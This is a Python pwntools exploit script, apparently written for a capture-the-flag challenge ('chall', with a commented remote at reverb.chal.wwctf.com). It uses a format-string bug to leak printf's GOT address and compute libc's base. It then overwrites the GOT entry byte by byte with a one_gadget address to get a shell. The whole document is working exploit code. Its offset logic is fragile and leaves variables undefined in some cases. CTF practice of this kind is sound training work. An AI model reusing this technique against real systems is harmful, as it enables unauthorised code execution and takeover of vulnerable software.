#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process()
#p = remote('reverb.chal.wwctf.com', 1337)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401484
#           ''')

payload = b'%11$saaa'
payload += p64(exe.got.printf)
p.sendline(payload)
p.recvuntil(b'>> ')

printf_ = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = printf_ - libc.sym.printf
print("libc: " + hex(libc.address))
one_gadget = 0xebd43 + libc.address
system_1  = one_gadget & 0xff
system_2 = one_gadget >> 8 & 0xff
system_3 = one_gadget >> 16 & 0xff

package = {
        system_1: exe.got.printf,
        system_2: exe.got.printf+1,
        system_3: exe.got.printf+2,
        }
sort = sorted(package)
print(sort)
print(sort[1]-sort[0])
print(sort[2]-sort[0]-sort[1])
log.info(f"system: {hex(one_gadget)}")
if(sort[0] == 67):
    temp = sort[0] - 20
if(sort[1]-sort[0] > 50):
    temp1 = sort[1] - 30


payload  = f"%20c%{temp}c%16$hhn".encode()
payload += f"%30c%{temp1-sort[0]}c%17$hhn".encode()
payload += f"%{sort[2]-sort[1]}c%18$hhn".encode()

payload  = payload.ljust(48,b'a')
payload += flat(
    package[sort[0]],
    package[sort[1]],
    package[sort[2]],
)
input()
p.sendlineafter(b'>> ',payload)
p.interactive()

